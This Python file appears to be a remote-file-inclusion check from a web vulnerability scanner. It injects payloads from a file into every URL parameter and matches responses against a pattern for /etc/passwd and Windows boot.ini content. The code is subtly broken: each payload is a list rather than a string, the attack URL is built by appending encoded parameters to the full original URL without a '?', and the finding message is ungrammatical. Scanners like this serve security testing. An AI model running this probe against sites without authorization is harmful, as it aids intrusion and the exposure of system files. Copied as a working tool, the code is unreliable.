import re
from urllib.parse import parse_qsl, urlencode, urlsplit

from lib.utils.container import Services
from .. import AttackPlugin


class Rfi(AttackPlugin):

    def process(self, start_url, crawled_urls):
        output = Services.get('output')
        request = Services.get('request_factory')
        datastore = Services.get('datastore')

        output.info('Checking remote file inclusion...')
        db = datastore.open('rfi.txt', 'r')
        dbfiles = [x.split('\n') for x in db]
        pl = r"root:/root:/bin/bash|default=multi([0])disk([0])rdisk([0])partition([1])\\WINDOWS"
        try:
            for payload in dbfiles:
                for url in crawled_urls:

                    # Current request parameters
                    params = dict(parse_qsl(urlsplit(url).query))
                    # Change the value of the parameters with the payload
                    tainted_params = {x: payload for x in params}

                    if len(tainted_params) > 0:
                        # Prepare the attack URL
                        attack_url = urlsplit(url).geturl() + urlencode(tainted_params)
                        resp = request.send(
                            url=attack_url,
                            method="GET",
                            payload=None,
                            headers=None
                        )
                        if re.search(pl, str(resp.content)):
                            output.finding(
                                'That site is may be vulnerable to Remote File Inclusion (RFI) at %s' % url)
        except Exception as e:
            output.error("Error occured\nAborting this attack...\n")
            return
